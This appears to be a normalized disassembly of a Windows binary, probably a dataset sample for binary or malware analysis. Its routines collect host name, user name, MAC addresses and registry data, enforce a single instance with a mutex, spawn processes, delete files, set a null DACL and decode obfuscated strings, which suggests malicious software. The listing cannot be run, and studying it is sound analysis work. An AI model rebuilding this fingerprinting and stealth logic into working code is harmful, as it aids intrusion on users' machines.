sub_401000
mov eax 0x1aec
call sub_418fe0
push ebx
push ebp
push esi
push edi
mov esi rw-data
lea edi [ esp + 0x5c ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ esp + 0x54 ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ esp + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ esp + 0x5c ]
xor ebx ebx
push eax
mov [ esp + 0x38 ] ebx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x14 ] ebx
movsb [ edi ] [ esi ]
call sub_40274f
lea eax [ esp + 0x58 ]
push eax
call sub_40274f
lea eax [ esp + 0x6c ]
push eax
call sub_40274f
push rw-data
call sub_40274f
push rw-data
call sub_40274f
add esp 0x14
xor esi esi
cmp [ rw-data ] ebx
jle r-xdata
push rw-data
call sub_40274f
mov [ esp ] rw-data
call sub_40274f
mov esi rw-data
push esi
call sub_40274f
push esi
call _strdup
push rw-data
mov [ rw-data ] eax
call sub_40274f
push rw-data
call sub_40274f
push rw-data
call sub_40274f
push rw-data
call sub_40274f
add esp 0x1c
mov ebx 0x104
mov esi rw-data
push ebx
push esi
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x5c
push esi
call strrchr
and [ eax ] 0x0
mov edi rw-data
push edi
call sub_40274f
push edi
call strlen
push eax
mov ebp rw-data
push edi
push ebp
call strncpy
add esp 0x1c
push ebx
push ebp
call [ DoEnvironmentSubstA@IAT ]
push rw-data
call sub_40274f
mov [ esp ] rw-data
call sub_40274f
mov [ esp ] rw-data
call sub_40274f
mov [ esp ] rw-data
call sub_40274f
mov [ esp ] rw-data
call sub_40274f
mov [ esp ] rw-data
call sub_40274f
mov [ esp ] rw-data
call sub_40274f
mov [ esp ] rw-data
call sub_40274f
mov [ esp ] rw-data
call sub_40274f
mov [ esp ] rw-data
call sub_40274f
mov [ esp ] rw-data
call sub_40274f
mov edi rw-data
push edi
call sub_40274f
push edi
call strlen
push eax
push edi
mov edi rw-data
push edi
call strncpy
add esp 0x18
push ebx
push edi
call [ DoEnvironmentSubstA@IAT ]
push rw-data
call sub_40274f
mov [ esp ] rw-data
mov edi rw-data
push esi
push edi
push rw-data
call sprintf
push rw-data
push esi
push edi
push rw-data
call sprintf
push rw-data
push esi
push edi
push rw-data
call sprintf
push rw-data
push esi
push edi
push rw-data
call sprintf
add esp 0x40
push rw-data
push esi
push edi
push rw-data
call sprintf
push rw-data
push esi
push edi
push rw-data
call sprintf
push rw-data
push esi
push edi
push rw-data
call sprintf
and [ esp + 0x54 ] 0x0
add esp 0x30
cmp [ rw-data ] 0x0
jle r-xdata
mov edi rw-data
push rw-data
push esi
push edi
push rw-data
call sprintf
push rw-data
push esi
push edi
push rw-data
call sprintf
push rw-data
push ebp
push edi
push rw-data
call sprintf
push rw-data
push ebp
push edi
push rw-data
call sprintf
add esp 0x40
push rw-data
push ebp
push edi
push rw-data
call sprintf
mov ebp rw-data
push ebp
call sub_40274f
and [ esp + 0x38 ] 0x0
add esp 0x14
cmp [ rw-data ] 0x0
jle r-xdata
mov [ esp + 0x18 ] rw-data
mov [ esp + 0x1c ] rw-data
push edi
call sub_40274f
inc esi
add edi 0x40
cmp esi [ rw-data ]
pop ecx
jl r-xdata
push ebp
push esi
mov ebp rw-data
push edi
push ebp
call sprintf
push rw-data
push esi
push edi
push rw-data
call sprintf
push rw-data
call sub_40274f
xor esi esi
push rw-data
mov [ rw-data ] 0x50
mov [ rw-data ] esi
call atoi
lea eax [ eax + eax * 4 ]
push rw-data
shl eax 0x1
mov [ rw-data ] eax
mov [ rw-data ] eax
call atoi
lea eax [ eax + eax * 4 ]
push rw-data
shl eax 0x1
mov [ rw-data ] eax
mov [ rw-data ] eax
call atoi
imul eax eax 0x3e8
push 0x1
mov [ rw-data ] eax
pop edi
mov [ rw-data ] esi
push rw-data
mov [ rw-data ] edi
mov [ rw-data ] esi
mov [ esp + 0x5c ] esi
call atoi
lea eax [ eax + eax * 8 ]
add esp 0x34
mov [ esp + 0x1c ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] edi
call [ GetVersion@IAT ]
movzx ecx al
mov [ rw-data ] ecx
xor ecx ecx
mov cl ah
mov [ rw-data ] eax
movzx eax cl
mov [ rw-data ] eax
call sub_402650
test eax eax
je r-xdata
mov [ esp + 0x18 ] rw-data
mov [ esp + 0x1c ] rw-data
push [ esp + 0x1c ]
push esi
push edi
push [ esp + 0x24 ]
call sprintf
add [ esp + 0x2c ] 0x2
add [ esp + 0x28 ] ebx
add esp 0x10
inc [ esp + 0x24 ]
mov eax [ esp + 0x24 ]
cmp eax [ rw-data ]
jl r-xdata
push 0x1
pop esi
call sub_402650
test eax eax
je r-xdata
push 0x1
call _sleep
pop ecx
push esi
push esi
push esi
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageA@IAT ]
test eax eax
jne r-xdata
push [ esp + 0x1c ]
call sub_40274f
push [ esp + 0x20 ]
push esi
push edi
push [ esp + 0x28 ]
call sprintf
add [ esp + 0x30 ] 0x20
add [ esp + 0x2c ] ebx
add esp 0x14
inc [ esp + 0x24 ]
mov eax [ esp + 0x24 ]
cmp eax [ rw-data ]
jl r-xdata
and [ rw-data ] 0x0
mov edi rw-data
push esi
push edi
call [ InitializeSecurityDescriptor@IAT ]
push 0x0
push 0x0
push esi
push edi
call [ SetSecurityDescriptorDacl@IAT ]
mov [ rw-data ] edi
jmp r-xdata
push esi
push esi
lea eax [ esp + 0x90 ]
push esi
push eax
call [ GetMessageA@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
push 0xfa0
call _sleep
mov eax [ rw-data ]
mov edi rw-data
add eax 0x4
push eax
push rw-data
push edi
call sprintf
add esp 0x10
push edi
push 0x0
push 0x0
call [ CreateMutexA@IAT ]
mov edi [ GetLastError@IAT ]
mov [ rw-data ] eax
call edi
cmp eax 0xb7
je r-xdata
lea eax [ esp + 0x4c ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] 0xc
mov [ rw-data ] esi
call sub_402650
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1aec
retn 0x10
call edi
cmp eax 0x5
je r-xdata
push esi
push rw-data
push [ esp + 0x54 ]
call sub_402890
add esp 0xc
push [ esp + 0x4c ]
call [ CloseHandle@IAT ]
push rw-data
call sub_402776
cmp eax esi
pop ecx
je r-xdata
push rw-data
call sub_402776
cmp eax esi
pop ecx
je r-xdata
push rw-data
call sub_4025f9
pop ecx
push rw-data
call sub_402776
cmp eax esi
pop ecx
je r-xdata
push rw-data
call sub_4025f9
pop ecx
xor edi edi
cmp [ rw-data ] edi
mov [ rw-data ] edi
jle r-xdata
push rw-data
call sub_4025f9
pop ecx
push [ rw-data ]
call _sleep
pop ecx
push ebp
call [ PathFileExistsA@IAT ]
test eax eax
jne r-xdata
mov esi rw-data
push rw-data
push ebp
call fopen
mov edi eax
pop ecx
test edi edi
pop ecx
je r-xdata
mov edi rw-data
push edi
call sub_40274f
push edi
call strlen
mov ebp eax
push ebp
push edi
call sub_40267e
push ebp
push edi
call sub_40c768
add esp 0x18
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] edi
inc edi
add esi ebx
cmp edi [ rw-data ]
jl r-xdata
and [ esp + 0x24 ] 0x0
cmp [ rw-data ] 0x0
jle r-xdata
xor ebp ebp
push esi
call [ PathFileExistsA@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
mov edi [ RegOpenKeyExA@IAT ]
lea eax [ esp + 0x20 ]
mov ebp 0x20019
push eax
push ebp
push 0x0
mov ebx 0x80000002
push rw-data
push ebx
call edi
mov esi [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
mov [ esp + 0x18 ] rw-data
mov esi rw-data
push edi
call _filbuf
pop ecx
mov ecx [ edi ]
movzx eax [ ecx ]
inc ecx
mov [ edi ] ecx
jmp r-xdata
push [ esp + 0x20 ]
call [ RegCloseKey@IAT ]
lea eax [ esp + 0x20 ]
push eax
push ebp
push 0x0
push rw-data
push ebx
call edi
test eax eax
jne r-xdata
push 0x400
lea eax [ esp + 0x100 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ esp + 0x14 ]
mov [ esp + 0x14 ] 0x400
push eax
lea eax [ esp + 0x100 ]
push eax
lea eax [ esp + 0x38 ]
push eax
push 0x0
push rw-data
push [ esp + 0x34 ]
call esi
test eax eax
je r-xdata
inc [ esp + 0x24 ]
add [ esp + 0x18 ] 0x40
mov eax [ esp + 0x24 ]
add esi ebx
cmp eax [ rw-data ]
jl r-xdata
push rw-data
push esi
call fopen
mov ebp eax
pop ecx
test ebp ebp
pop ecx
je r-xdata
and [ esp + ebp + 0xfc ] 0x0
lea eax [ esp + 0xfc ]
push eax
call _strdup
push edi
mov [ rw-data ] eax
call fclose
pop ecx
pop ecx
mov [ esp + ebp + 0xfc ] al
inc ebp
cmp ebp 0x3ff
jl r-xdata
cmp eax 0xffffffff
je r-xdata
push rw-data
push 0x400
push eax
lea eax [ esp + 0x104 ]
push eax
call memset
add esp 0xc
lea eax [ esp + 0x14 ]
mov [ esp + 0x14 ] 0x400
push eax
lea eax [ esp + 0x100 ]
push eax
lea eax [ esp + 0x38 ]
push eax
push 0x0
push rw-data
push [ esp + 0x34 ]
call esi
test eax eax
jne r-xdata
mov cl [ esp + 0xfc ]
lea eax [ esp + 0xfc ]
lea esi [ esp + 0xfc ]
lea eax [ esp + 0x14 ]
push eax
lea eax [ esp + 0x100 ]
push eax
lea eax [ esp + 0x38 ]
push eax
push 0x0
push rw-data
push [ esp + 0x34 ]
call esi
test eax eax
je r-xdata
push esi
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
xor edi edi
dec [ edi + 0x4 ]
js r-xdata
push rw-data
push rw-data
jmp r-xdata
lea eax [ esp + 0xfc ]
push eax
jmp r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
cmp cl 0x20
je r-xdata
and [ esp + 0xfc ] 0x0
push ebp
call _filbuf
pop ecx
mov ecx [ ebp ]
movzx eax [ ecx ]
inc ecx
mov [ ebp ] ecx
jmp r-xdata
push [ esp + 0x20 ]
call [ RegCloseKey@IAT ]
push 0x7f
lea eax [ esp + 0x18 ]
pop esi
push eax
push rw-data
mov [ esp + 0x1c ] esi
call [ GetComputerNameA@IAT ]
lea eax [ esp + 0x14 ]
mov [ esp + 0x14 ] esi
push eax
push rw-data
call [ GetUserNameA@IAT ]
mov ebx rw-data
push ebx
call sub_40292f
cmp eax 0x1
pop ecx
je r-xdata
push [ esp + 0x14 ]
lea eax [ esp + 0x100 ]
push ebp
push eax
call memset
add esp 0xc
lea eax [ esp + 0x14 ]
mov edi 0x400
push eax
lea eax [ esp + 0x34 ]
push rw-data
push eax
push ebp
push rw-data
push [ esp + 0x34 ]
mov [ esp + 0x2c ] edi
call esi
test eax eax
je r-xdata
push ebx
call edi
xor ebp ebp
mov ebx rw-data
cmp eax ebp
jne r-xdata
call _strdup
pop ecx
mov [ rw-data ] eax
push [ esp + 0x20 ]
call [ RegCloseKey@IAT ]
call sub_402650
test eax eax
lea eax [ esp + 0x20 ]
push eax
push ebp
push 0x0
je r-xdata
and [ esi ] 0x0
lea eax [ esp + 0xfc ]
push eax
call _strdup
mov esi [ RegQueryValueExA@IAT ]
pop ecx
mov [ rw-data ] eax
mov [ esi ] cl
inc esi
inc eax
jmp r-xdata
mov cl [ eax + 0x1 ]
inc eax
jmp r-xdata
cmp cl 0x9
jne r-xdata
and [ esp + edi + 0xfc ] 0x0
lea eax [ esp + 0xfc ]
push eax
call _strdup
mov edi eax
lea eax [ esp + 0x100 ]
push eax
call strlen
mov [ esp + 0x34 ] eax
lea eax [ esp + 0x34 ]
push eax
push edi
call sub_40c89c
push [ esp + 0x3c ]
mov edi eax
push edi
call sub_40267e
add esp 0x18
cmp [ esp + 0x2c ] 0x40
jge r-xdata
mov [ esp + edi + 0xfc ] al
inc edi
cmp edi 0x3ff
jl r-xdata
cmp eax 0xffffffff
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_402513
push [ esp + 0x14 ]
lea eax [ esp + 0x100 ]
push ebp
push eax
call memset
add esp 0xc
lea eax [ esp + 0x14 ]
mov [ esp + 0x14 ] edi
push eax
lea eax [ esp + 0x34 ]
push ebx
push eax
push ebp
push rw-data
push [ esp + 0x34 ]
call esi
test eax eax
je r-xdata
and [ rw-data ] 0x0
test cl cl
je r-xdata
push ebp
call fclose
pop ecx
push edi
push rw-data
push [ esp + 0x20 ]
call sprintf
add esp 0xc
dec [ ebp + 0x4 ]
js r-xdata
mov edi 0x280
push edi
call malloc
mov esi eax
pop ecx
lea eax [ esp + 0x38 ]
mov [ esp + 0x38 ] edi
push eax
push esi
call GetAdaptersInfo
cmp eax 0x6f
jne r-xdata
lea eax [ esp + 0xa4 ]
push eax
call sub_40bd78
push ebx
call strlen
push eax
lea eax [ esp + 0xb0 ]
push ebx
push eax
call sub_40bdaf
lea eax [ esp + 0xb8 ]
push eax
lea eax [ esp + 0x8c ]
push eax
call sub_40be51
add esp 0x1c
xor edi edi
mov esi rw-data
call sub_402650
test eax eax
je r-xdata
lea eax [ esp + 0x38 ]
push eax
push esi
call GetAdaptersInfo
test eax eax
jne r-xdata
push esi
call free
push [ esp + 0x3c ]
call malloc
pop ecx
mov esi eax
pop ecx
movzx eax [ esp + edi + 0x74 ]
push eax
push rw-data
push 0x20
push esi
call _snprintf
add esp 0x10
inc edi
inc esi
inc esi
cmp edi 0x10
jl r-xdata
and [ rw-data ] 0x0
push [ esp + 0x14 ]
lea eax [ esp + 0x100 ]
push ebp
push eax
call memset
add esp 0xc
lea eax [ esp + 0x14 ]
mov [ esp + 0x14 ] edi
push eax
lea eax [ esp + 0x34 ]
push ebx
push eax
push ebp
push rw-data
push [ esp + 0x34 ]
call esi
test eax eax
je r-xdata
lea eax [ esp + 0x6fc ]
push rw-data
push eax
call sprintf
pop ecx
pop ecx
and [ esp + 0x6fc ] al
mov esi 0x1000
lea eax [ esp + 0xafc ]
push esi
push ebp
push eax
call memset
push ebx
push rw-data
lea eax [ esp + 0xb10 ]
push esi
push eax
call _snprintf
lea eax [ esp + 0xb18 ]
push eax
call strlen
push eax
lea eax [ esp + 0xb20 ]
push eax
push ebx
call strncpy
add esp 0x2c
lea eax [ esp + 0x64 ]
push eax
push esi
call strstr
pop ecx
test eax eax
pop ecx
jne r-xdata
lea eax [ esp + 0x54 ]
push eax
push esi
call strstr
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ esp + 0x6fc ]
push ebx
push eax
mov esi rw-data
push [ rw-data ]
push rw-data
push esi
call sprintf
lea eax [ esp + 0x70 ]
push eax
push esi
call strstr
add esp 0x1c
test eax eax
jne r-xdata
lea eax [ esi + 0x1b0 ]
push eax
lea eax [ esp + 0x700 ]
push eax
call strcat
lea eax [ esp + 0x704 ]
push rw-data
push eax
call strcat
mov esi [ esi ]
add esp 0x10
jmp r-xdata
mov ebp [ esp + 0x28 ]
push ebp
call exit
cmp esi ebp
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x72
cmp eax 0x1
je r-xdata
and [ rw-data ] 0x0
push [ rw-data ]
test ebp ebp
je r-xdata
cmp eax 0x2
jne r-xdata
call strlen
mov esi rw-data
mov edi eax
push esi
call strlen
pop ecx
pop ecx
call strlen
mov esi rw-data
mov edi eax
push esi
call strlen
push ebp
add edi eax
call strlen
add esp 0xc
jmp r-xdata
mov edi [ GetTickCount@IAT ]
call edi
mov eax [ rw-data ]
push 0x1
push [ rw-data ]
mov esi rw-data
shl eax 0x6
add eax esi
mov ebp rw-data
push eax
push 0x0
push ebp
call sub_402b19
mov ebx eax
add esp 0x14
test ebx ebx
je r-xdata
and [ rw-data ] 0x0
movsx eax [ rw-data ]
push eax
push esi
push [ rw-data ]
push rw-data
push ebx
push edi
call _snprintf
add esp 0x18
movsx eax [ rw-data ]
push ebp
push eax
push esi
push [ rw-data ]
push rw-data
push ebx
push edi
call _snprintf
add esp 0x1c
jmp r-xdata
lea ebx [ edi + eax + 0x7 ]
push ebx
call malloc
mov edi eax
push ebx
push 0x0
push edi
call memset
add esp 0x10
test ebp ebp
je r-xdata
inc [ esp + 0x10 ]
push rw-data
push ebx
call strstr
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ rw-data ]
push 0x2
push [ rw-data ]
shl eax 0x6
add eax rw-data
push eax
push edi
push rw-data
call sub_402b19
add esp 0x14
mov ebx eax
test edi edi
mov [ esp + 0x28 ] ebx
je r-xdata
push ebp
call free
pop ecx
xor ebp ebp
test ebp ebp
je r-xdata
inc [ esp + 0x10 ]
mov ebx 0x270f
push rw-data
push eax
call strstr
pop ecx
test eax eax
pop ecx
je r-xdata
inc [ esp + 0x10 ]
call edi
jmp r-xdata
test ebx ebx
je r-xdata
push edi
call free
pop ecx
inc [ esp + 0x10 ]
mov edi 0x270f
push rw-data
push ebp
call strstr
pop ecx
test eax eax
pop ecx
je r-xdata
inc [ esp + 0x10 ]
mov ebx 0x270f
call edi
mov ebx eax
sub ebx [ esp + 0x28 ]
jmp r-xdata
call edi
mov [ esp + 0x28 ] eax
mov eax [ rw-data ]
push 0x1
push [ rw-data ]
shl eax 0x6
add eax esi
push eax
push 0x0
push ebp
call sub_402b19
add esp 0x14
mov [ esp + 0x18 ] eax
test eax eax
je r-xdata
push ebx
call free
pop ecx
jmp r-xdata
mov eax [ rw-data ]
imul eax eax 0x64
push eax
call _sleep
pop ecx
push rw-data
push ebx
call strstr
pop ecx
test eax eax
pop ecx
je r-xdata
inc [ esp + 0x10 ]
mov esi 0x270f
push rw-data
push ebp
call strstr
pop ecx
test eax eax
pop ecx
je r-xdata
inc [ esp + 0x10 ]
mov edi 0x270f
call edi
mov edi eax
sub edi [ esp + 0x28 ]
jmp r-xdata
call edi
mov [ esp + 0x28 ] eax
mov eax [ rw-data ]
push 0x1
push [ rw-data ]
shl eax 0x6
add eax esi
push eax
push 0x0
push ebp
call sub_402b19
mov ebp eax
add esp 0x14
test ebp ebp
je r-xdata
push [ esp + 0x18 ]
call free
pop ecx
jmp r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
jle r-xdata
push 0xffffffff
push 0xffffffff
call [ GetCurrentProcess@IAT ]
push eax
call [ SetProcessWorkingSetSize@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
and [ esp + 0x10 ] 0x0
cmp [ esp + 0x34 ] 0x0
jne r-xdata
mov [ rw-data ] 0x69
mov ebp edi
push esi
call free
pop ecx
inc [ esp + 0x10 ]
mov esi 0x270f
call [ GetTickCount@IAT ]
mov esi eax
sub esi [ esp + 0x28 ]
jmp r-xdata
call [ GetTickCount@IAT ]
mov [ esp + 0x28 ] eax
mov eax [ rw-data ]
push 0x1
push [ rw-data ]
shl eax 0x6
add eax esi
push eax
push 0x0
push rw-data
call sub_402b19
mov ebp eax
add esp 0x14
test ebp ebp
je r-xdata
push ebp
call free
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ rw-data ]
mov edi rw-data
xor ebp ebp
push edi
push ebx
mov [ esp + 0x20 ] ebp
call strstr
mov esi eax
pop ecx
cmp esi ebp
pop ecx
je r-xdata
mov ebp [ PathFileExistsA@IAT ]
mov esi rw-data
push esi
mov [ esp + 0x38 ] 0x1
call ebp
test eax eax
mov edi rw-data
jne r-xdata
lea eax [ esp + 0x6fc ]
push rw-data
push eax
lea eax [ esi + edi ]
push 0x3
add eax ebx
xor edx edx
pop ecx
div ecx
push eax
push esi
push edi
push ebx
push rw-data
push rw-data
push [ rw-data ]
mov esi rw-data
push [ rw-data ]
push rw-data
push rw-data
push rw-data
push esi
call sprintf
push esi
call _strdup
mov esi eax
push esi
call strlen
add esp 0x40
mov [ rw-data ] eax
push eax
push esi
call sub_40267e
push [ rw-data ]
push esi
call sub_40c768
add esp 0x10
mov edi eax
test esi esi
je r-xdata
push ebp
call free
pop ecx
jmp r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
jmp r-xdata
push ebx
call free
mov edi [ PathFileExistsA@IAT ]
pop ecx
mov esi rw-data
push esi
call edi
test eax eax
je r-xdata
push 0x2
pop ebx
push edi
call strlen
push 0x2
add esi eax
pop ebx
push ebx
push rw-data
push esi
call strncmp
add esp 0x10
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov esi rw-data
imul eax eax 0x104
add eax esi
push eax
call ebp
test eax eax
jne r-xdata
push edi
push esi
call fopen
pop ecx
test eax eax
pop ecx
je r-xdata
mov [ rw-data ] eax
jmp r-xdata
call rand
mov esi [ rw-data ]
mov ecx [ rw-data ]
sub esi ecx
xor edx edx
div esi
add edx ecx
mov [ rw-data ] edx
mov eax [ rw-data ]
mov esi rw-data
imul eax eax 0x104
add eax esi
push eax
call edi
test eax eax
je r-xdata
push esi
call [ DeleteFileA@IAT ]
xor ebp ebp
call sub_402650
test eax eax
je r-xdata
push ebx
push rw-data
push esi
call strncmp
add esp 0xc
test eax eax
jne r-xdata
add esi ebx
mov [ esp + 0x18 ] 0x1
cmp [ esi ] 0x0
lea eax [ esi + 0x1 ]
je r-xdata
cmp [ esp + 0x50 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push edi
imul eax eax 0x104
add eax esi
push eax
call fopen
pop ecx
test eax eax
pop ecx
je r-xdata
push eax
call fclose
pop ecx
cmp [ esp + 0x10 ] 0x3
jle r-xdata
mov eax [ rw-data ]
imul eax eax 0x104
add eax esi
push eax
call [ DeleteFileA@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0xffffffff
push 0xffffffff
call [ GetCurrentProcess@IAT ]
push eax
call [ SetProcessWorkingSetSize@IAT ]
push rw-data
push rw-data
jmp r-xdata
cmp [ rw-data ] ebp
jne r-xdata
mov edi [ PathFileExistsA@IAT ]
mov esi rw-data
push esi
call edi
test eax eax
je r-xdata
push esi
call strlen
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x30 ]
push eax
push esi
call sub_40c89c
push [ esp + 0x38 ]
mov esi eax
push esi
call sub_40267e
add esp 0x14
cmp [ esi ] 0x0
mov eax esi
je r-xdata
cmp [ eax ] 0x20
jne r-xdata
push [ rw-data ]
mov esi rw-data
mov [ esp + 0x54 ] 0x1
push rw-data
push esi
call sprintf
add esp 0xc
push esi
push 0x0
push 0x0
call [ CreateMutexA@IAT ]
mov esi [ GetLastError@IAT ]
mov [ rw-data ] eax
call esi
cmp eax 0xb7
je r-xdata
push eax
call fclose
pop ecx
inc [ esp + 0x10 ]
inc [ rw-data ]
and [ esp + 0x10 ] 0x0
and [ rw-data ] 0x0
jmp r-xdata
cmp eax ebx
je r-xdata
cmp [ esp + 0x18 ] 0x1
je r-xdata
push [ esp + 0x28 ]
call free
pop ecx
call sub_402650
test eax eax
je r-xdata
push esi
call strlen
push eax
push esi
call sub_40267e
push [ rw-data ]
push esi
call sub_40c768
push esi
mov edi eax
call free
add esp 0x18
mov ebp edi
jmp r-xdata
lea eax [ esp + 0x600 ]
push eax
call sprintf
pop ecx
lea eax [ esp + 0x600 ]
pop ecx
push eax
call sub_402cf7
mov esi eax
pop ecx
cmp esi ebp
je r-xdata
mov eax [ rw-data ]
mov esi rw-data
imul eax eax 0x104
add eax esi
push eax
call edi
test eax eax
je r-xdata
push esi
call [ DeleteFileA@IAT ]
push esi
call sub_402cf7
test esi esi
pop ecx
mov edi eax
je r-xdata
mov cl [ eax ]
cmp cl 0xd
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
and [ eax ] 0x0
push 0x1
call exit
call esi
cmp eax 0x5
je r-xdata
and [ esp + 0x34 ] 0x0
mov edx ebx
mov [ rw-data ] 0x1
mov edx [ rw-data ]
cmp [ rw-data ] edx
je r-xdata
inc [ rw-data ]
and [ esp + 0x10 ] 0x0
and [ esp + 0x34 ] 0x0
mov [ rw-data ] ebx
mov eax [ rw-data ]
imul eax eax 0x104
add eax esi
push eax
call [ DeleteFileA@IAT ]
test edi edi
je r-xdata
push esi
call free
pop ecx
and [ eax ] 0x0
cmp cl 0xa
jne r-xdata
mov esi rw-data
push esi
call ebp
test eax eax
jne r-xdata
call sub_402650
test eax eax
je r-xdata
mov edi [ GetLocalTime@IAT ]
xor ebx ebx
mov [ rw-data ] edx
test edx edx
jle r-xdata
call rand
mov esi [ rw-data ]
mov ecx [ rw-data ]
sub esi ecx
xor edx edx
div esi
add edx ecx
jmp r-xdata
push edi
call strlen
push eax
push edi
call sub_40267e
push [ rw-data ]
push edi
call sub_40c768
push edi
mov esi eax
call free
add esp 0x18
mov ebp esi
jmp r-xdata
inc eax
cmp [ eax ] 0x0
jne r-xdata
mov esi rw-data
push edi
push esi
call fopen
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
push rw-data
call atoi
lea eax [ eax + eax * 8 ]
mov [ esp ] rw-data
mov [ esp + 0x20 ] eax
call sub_4025f9
pop ecx
mov esi rw-data
push esi
call ebp
test eax eax
jne r-xdata
push eax
call fclose
pop ecx
cmp [ rw-data ] 0x1
jne r-xdata
inc [ rw-data ]
mov eax [ rw-data ]
cmp eax [ rw-data ]
jl r-xdata
push esi
call ebp
push edi
push esi
call fopen
pop ecx
test eax eax
pop ecx
je r-xdata
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
inc [ rw-data ]
mov eax [ rw-data ]
cmp eax [ rw-data ]
jl r-xdata
and [ rw-data ] 0x0
lea eax [ esp + 0x3c ]
push eax
call edi
movzx eax [ esp + 0x48 ]
push eax
movzx eax [ esp + 0x4a ]
push eax
movzx eax [ esp + 0x4c ]
push eax
movzx eax [ esp + 0x4e ]
push eax
movzx eax [ esp + 0x4e ]
push eax
movzx eax [ esp + 0x50 ]
push eax
lea eax [ esp + 0x514 ]
push rw-data
push eax
call sprintf
lea eax [ esp + 0x51c ]
push eax
call sub_405fdd
mov esi eax
push esi
call strlen
add esp 0x28
mov [ rw-data ] eax
test esi esi
jne r-xdata
push eax
call fclose
pop ecx
jmp r-xdata
push 0x64
call _sleep
dec [ esp + 0x20 ]
pop ecx
cmp [ esp + 0x1c ] 0x0
jg r-xdata
jmp r-xdata
and [ rw-data ] 0x0
lea eax [ esp + 0x3c ]
push eax
call edi
movzx eax [ esp + 0x48 ]
push eax
movzx eax [ esp + 0x4a ]
push eax
movzx eax [ esp + 0x4c ]
push eax
movzx eax [ esp + 0x4e ]
push eax
movzx eax [ esp + 0x4e ]
push eax
movzx eax [ esp + 0x50 ]
push eax
lea eax [ esp + 0x594 ]
push rw-data
push eax
call sprintf
lea eax [ esp + 0x59c ]
push eax
call sub_4061f0
mov esi eax
push esi
call strlen
add esp 0x28
mov [ rw-data ] eax
test esi esi
jne r-xdata
push esi
call strlen
push eax
push esi
call sub_40267e
push [ rw-data ]
push esi
call sub_40c768
push esi
mov edi eax
call free
add esp 0x18
mov ebp edi
jmp r-xdata
sub_402513
push ebp
mov ebp esp
mov eax 0x14020
call sub_418fe0
and [ ebp - 0xc ] 0x0
push ebx
push edi
mov ebx rw-data
push rw-data
push ebx
call sprintf
pop ecx
lea eax [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x10 ] 0x14000
push eax
lea eax [ ebp - 0x14020 ]
push eax
call GetAdaptersInfo
mov ecx eax
xor eax eax
lea edi [ ebp - 0x8 ]
stosd [ edi ]
test ecx ecx
stosw [ edi ]
jne r-xdata
pop edi
pop ebx
leave
retn
push esi
lea esi [ ebp - 0x14020 ]
mov edi rw-data
mov cl [ esi + eax + 0x194 ]
xor [ ebp + eax - 0x8 ] cl
inc eax
cmp eax 0x6
jl r-xdata
mov esi [ esi ]
inc [ ebp - 0xc ]
test esi esi
je r-xdata
movzx eax [ ebp - 0x3 ]
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x5 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x7 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
push edi
push ebx
call sprintf
add esp 0x20
pop esi
cmp [ ebp - 0xc ] 0xa
jl r-xdata
movzx eax [ esi + 0x199 ]
push eax
movzx eax [ esi + 0x198 ]
push eax
movzx eax [ esi + 0x197 ]
push eax
movzx eax [ esi + 0x196 ]
push eax
movzx eax [ esi + 0x195 ]
push eax
movzx eax [ esi + 0x194 ]
push eax
lea eax [ ebp - 0x20 ]
push edi
push eax
call sprintf
add esp 0x20
xor eax eax
sub_4025f9
push ebp
mov ebp esp
sub esp 0x54
push esi
xor esi esi
push 0x44
lea eax [ ebp - 0x54 ]
push esi
push eax
call memset
push 0x10
lea eax [ ebp - 0x10 ]
push esi
push eax
call memset
add esp 0x18
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x54 ] 0x44
mov [ ebp - 0x28 ] 0x81
push eax
lea eax [ ebp - 0x54 ]
push eax
push esi
push esi
push 0x20
push esi
push esi
push esi
mov [ ebp - 0x24 ] si
push [ ebp + 0x8 ]
push esi
call [ CreateProcessA@IAT ]
neg eax
sbb eax eax
pop esi
inc eax
leave
retn
sub_40267e
mov eax [ esp + 0x4 ]
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi rw-data
test edi edi
mov ecx esi
jle r-xdata
pop edi
pop esi
retn
cmp [ ecx ] 0x0
jne r-xdata
mov dl [ ecx ]
add dl 0x17
